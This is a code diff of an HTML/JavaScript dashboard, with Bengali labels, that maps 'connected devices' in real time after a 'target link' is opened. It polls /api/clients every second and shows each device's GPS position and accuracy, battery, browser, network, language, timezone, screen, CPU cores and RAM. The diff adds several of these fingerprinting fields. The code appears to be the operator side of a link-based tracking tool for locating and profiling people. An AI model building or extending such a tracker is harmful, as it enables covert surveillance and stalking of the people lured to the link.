@@ -11,11 +11,12 @@
         .dashboard { display: flex; flex-wrap: wrap; gap: 20px; }
         .map-container { flex: 2; min-width: 300px; height: 500px; background: #1e293b; border-radius: 15px; overflow: hidden; }
         #map { height: 100%; width: 100%; }
-        .info-panel { flex: 1; min-width: 250px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
+        .info-panel { flex: 1; min-width: 300px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
         .info-panel h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #334155; padding-bottom: 10px; }
-        .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid #38bdf8; }
-        .device-card .name { font-weight: bold; font-size: 16px; }
-        .device-card .detail { font-size: 13px; color: #94a3b8; margin-top: 4px; }
+        .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; }
+        .device-card .name { font-weight: bold; font-size: 16px; color: #38bdf8; }
+        .device-card .detail { font-size: 13px; color: #94a3b8; margin-top: 6px; line-height: 1.4; }
+        .device-card .detail b { color: #e2e8f0; }
         .online { border-left-color: #22c55e; }
         .no-data { text-align: center; color: #64748b; margin-top: 50px; }
     </style>
@@ -29,7 +30,7 @@
         <div class="info-panel">
             <h2>📱 কানেক্টেড ডিভাইস</h2>
             <div id="deviceList">
-                <div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।<br>টার্গেট লিংকটি খুলে সম্মতি দিন।</div>
+                <div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।<br>টার্গেট লিংকটি খুলে সম্মতি দিন।</div>
             </div>
         </div>
     </div>
@@ -42,7 +43,7 @@
         }).addTo(map);
         
         let markers = {};
-        let circles = {}; // নির্ভুলতার বৃত্ত রাখার জন্য
+        let circles = {};
 
         function fetchClients() {
             fetch('/api/clients')
@@ -53,7 +54,7 @@
                     const clientIds = Object.keys(clients);
 
                     if (clientIds.length === 0) {
-                        list.innerHTML = '<div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>';
+                        list.innerHTML = '<div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>';
                         Object.keys(markers).forEach(id => {
                             map.removeLayer(markers[id]);
                             if(circles[id]) map.removeLayer(circles[id]);
@@ -67,14 +68,21 @@
                         const data = clients[id];
                         const card = document.createElement('div');
                         card.className = 'device-card online';
+                        
                         card.innerHTML = `
-                            <div class="name">🖥️ ${data.os || 'অজানা ডিভাইস'}</div>
-                            <div class="detail">🔋 ব্যাটারি: ${data.battery || 'N/A'}%</div>
-                            <div class="detail">🌐 ব্রাউজার: ${data.browser || 'N/A'} | 📶 নেটওয়ার্ক: ${data.network || 'N/A'}</div>
-                            <div class="detail">📱 স্ক্রিন: ${data.screen || 'N/A'}</div>
-                            <div class="detail">📍 অবস্থান: ${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</div>
-                            <div class="detail" style="font-size:11px; color:#facc15;">🎯 নির্ভুলতা: ${data.accuracy ? Math.round(data.accuracy) + ' মিটার' : 'N/A'}</div>
-                            <div class="detail" style="font-size:11px; color:#64748b;">🕒 শেষ আপডেট: ${data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A'}</div>
+                            <div class="name">📱 ${data.device || 'অজানা ডিভাইস'}</div>
+                            <div class="detail">🌐 ব্রাউজার: <b>${data.browser || 'N/A'}</b></div>
+                            <div class="detail">🔋 ব্যাটারি: <b>${data.battery || 'N/A'}%</b> (${data.charging || 'N/A'})</div>
+                            <div class="detail">📶 নেটওয়ার্ক: <b>${data.network || 'N/A'}</b></div>
+                            <div class="detail">🗣️ ভাষা: <b>${data.language || 'N/A'}</b></div>
+                            <div class="detail">🕒 টাইমজোন: <b>${data.timezone || 'N/A'}</b></div>
+                            <div class="detail">🖥️ স্ক্রিন: <b>${data.screen || 'N/A'}</b> | পিক্সেল রেশিও: <b>${data.pixelRatio}</b></div>
+                            <div class="detail">⚙️ CPU কোর: <b>${data.cores}</b> | RAM: <b>${data.memory}</b></div>
+                            <div class="detail" style="margin-top:10px; padding-top:10px; border-top: 1px solid #334155;">
+                                📍 অবস্থান: <b>${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</b><br>
+                                🎯 নির্ভুলতা: <b>${data.accuracy ? Math.round(data.accuracy) + ' মিটার' : 'N/A'}</b><br>
+                                🕒 শেষ আপডেট: <b>${data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A'}</b>
+                            </div>
                         `;
                         list.appendChild(card);
 
@@ -82,27 +90,28 @@
                             const pos = [parseFloat(data.lat), parseFloat(data.lng)];
                             const acc = data.accuracy ? parseFloat(data.accuracy) : 50;
                             
-                            // মার্কার আপডেট
                             if (markers[id]) {
                                 markers[id].setLatLng(pos);
                                 if(circles[id]) circles[id].setLatLng(pos).setRadius(acc);
                             } else {
                                 const marker = L.marker(pos).addTo(map);
-                                marker.bindPopup(`<b>${data.os}</b><br>নির্ভুলতা: ~${Math.round(acc)}m`);
+                                marker.bindPopup(`<b>${data.device}</b><br>ব্যাটারি: ${data.battery}%`);
                                 markers[id] = marker;
                                 
-                                // নির্ভুলতার বৃত্ত তৈরি
                                 const circle = L.circle(pos, { radius: acc, color: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
                                 circles[id] = circle;
                             }
-                            map.setView(pos, 16); // লোকেশনে জুম করা
+                            // ম্যাপে প্রথমবার লোড হলে জুম করবে, বারবার জুম হবে না
+                            if (Object.keys(markers).length === 1 && !window.initialZoomDone) {
+                                map.setView(pos, 15);
+                                window.initialZoomDone = true;
+                            }
                         }
                     });
                 })
                 .catch(err => console.error("Error fetching clients:", err));
         }
 
-        // প্রথমবার কল হবে, তারপর প্রতি ১ সেকেন্ডে (১০০০ মিলি সেকেন্ড) রিফ্রেশ হবে
         fetchClients();
         setInterval(fetchClients, 1000);
     </script>
